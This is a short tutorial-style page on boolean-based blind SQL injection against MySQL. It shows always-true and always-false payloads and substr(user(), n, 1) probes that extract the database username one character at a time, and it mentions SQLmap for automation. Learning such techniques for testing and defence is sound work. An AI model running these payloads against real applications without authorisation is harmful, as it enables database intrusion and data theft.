# Blind SQLi

Blind SQLi is an inference methodology you can use when the application is not exploitable via in-band or error-based, but still vulnerable.

This does not mean that blind SQL injection are only exploitable if the first two methods does not work \(Read: does not print errors on its output\).

The basic principle is that you want to transform your query in a true-false condition, because its still possible to receive a 'binary' result.

Example:

We have an vulnerable parameter, named id.

We can guess the dynamic query structure:

```text
SELECT  FROM  WHERE id='';
```

The query probably looks something like this:

```text
SELECT filename, views FROM images WHERE id='';
```

So we can trigger an always true condition and see if the expected result still returns.

`' OR 'a'='a'`

`' OR '1'='1`

Now, we can try a false condition:

`' OR '1'='11`

If this does not find anything in the database, in a sense that it does not return any result, its clearly an exploitable SQL injection.

After that, you can ask the database questions like:

Is the first letter of the username 'a'?  
Does this databsae contain three tables?

Lets say if we are attacking an MySQL database and we want to find the current database user. We will use two MySQL functions, `user()` and `substring()`

user\(\) returns the name of the user currently using the database. substring\(\) returns a substring of the given argument, It takes three parameters: the input string,. the position of the substring and its length, example:

```text
mysql> select substring('jeannovak', 2, 1); 
Result: e

mysq> select substring(user(), 1, 1); 
Result: r
```

Beyond that, SQL allows you to test the output of a funcion in a true/false condition:

```text
select substring(user(), 1, 1) = 'r'; 
Result: 1 

*1 = true, 0 = false.
```

By combining those features, we can iterate over the letters of the username by using payloads like:

```text
' or substr(user(), 1, 1) = 'a 
' or substr(user(), 1, 1) = 'b
```

When we find the first letter, we can move to the second

```text
' or substr(user(), 2, 1) = 'a 
' or substr(user(), 2, 1) = 'b
```

We continue down this path until we know the entire username.

If when sending the query, the page shows content, this means it is a TRUE result, in a sense that the question you're asking is correct.

Submitting all payloads needed to find an username by hand is impractical, so it would be nearly impossible to extract the content of an entire database by using manual blind SQLi. Thats why we use SQLmap for this stuff.

